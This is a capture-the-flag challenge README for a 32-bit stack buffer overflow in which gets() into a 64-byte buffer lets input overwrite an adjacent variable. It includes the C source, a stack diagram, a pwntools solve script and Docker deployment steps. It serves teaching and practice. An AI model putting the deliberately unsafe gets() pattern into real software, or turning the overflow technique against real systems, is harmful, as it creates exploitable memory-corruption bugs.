# PWN Challenge: cek-var

## Description
This is a stack-based buffer overflow challenge where you need to control a local variable to satisfy a condition in the `win()` function. The challenge demonstrates how buffer overflows can overwrite adjacent stack variables.

## Challenge Details
- **Binary**: `cek-var` (32-bit ELF)
- **Vulnerability**: Buffer overflow in `vuln()` function using `gets()`
- **Objective**: Overwrite the `var` variable to call `win(0xdeadbeef)`
- **Architecture**: x86 (32-bit)
- **Protections**: No stack protector, executable stack, no PIE

## Vulnerability Analysis
```c
void vuln() {
    char buffer[64];        // 64-byte buffer
    int var = 0x69696969;   // Target variable to overwrite
    
    printf("nama: ");
    gets(buffer);           // Vulnerable - no bounds checking
    
    printf("halo %s\n", buffer);
    win(var);               // var must be 0xdeadbeef
}

void win(int magic1) {
    if (magic1 == 0xdeadbeef) {
        // Prints the flag
    } else {
        printf("bye!\n");
    }
}
```

## Stack Layout
The stack layout in the `vuln()` function:
```
Higher addresses
+------------------+
| Return Address   |  
+------------------+
| Saved EBP        |  
+------------------+
| var (4 bytes)    |  ← Target: must be 0xdeadbeef
+------------------+
| buffer[64]       |  ← Input goes here
+------------------+
Lower addresses
```

## Exploitation Strategy
1. **Calculate offset**: Find exact bytes needed to reach `var`
2. **Craft payload**: `buffer_padding + 0xdeadbeef`
3. **Stack layout**: Buffer overflows into `var` variable
4. **Bypass check**: Make `win()` function receive 0xdeadbeef

## Example Exploit
```python
from pwn import *

# Connect to service
io = remote('localhost', 9999)

# Payload: 64 bytes of padding + target value
payload = b'A' * 64                    # Fill buffer
payload += p32(0xdeadbeef)             # Overwrite var

# Send payload
io.sendlineafter(b'nama: ', payload)
io.interactive()
```

## Deployment

### Using Docker Compose
```bash
cd server
docker-compose up --build -d
```

The service will be available on port 9999.

### Manual Docker Build
```bash
cd server
docker build -t cek-var .
docker run -p 9999:9999 cek-var
```

## Testing Connection
```bash
nc localhost 9999
```

## Files Structure
```
server/
├── Dockerfile
├── docker-compose.yml
├── README.md
└── files/
    ├── cek-var                        # Challenge binary (32-bit)
    └── flag.txt                       # Flag file
```

## Security Features
- Container runs with `nobody` user
- Resource limits applied (128M RAM, 0.5 CPU)
- Read-only filesystem with tmpfs for `/tmp`
- No new privileges allowed

## Learning Objectives
- Understanding stack variable layout
- Local variable overwrite techniques
- Stack frame structure analysis
- Precise payload crafting

## Hints
- Buffer size is exactly 64 bytes
- Target variable is adjacent to buffer on stack
- Use little-endian format for 0xdeadbeef
- No need to control return address - just the variable

## Common Pitfalls
- Incorrect padding calculation
- Wrong endianness for target value
- Overwriting too much (corrupting other variables)
- Not accounting for stack alignment

## Stopping the Service
```bash
docker-compose down
```
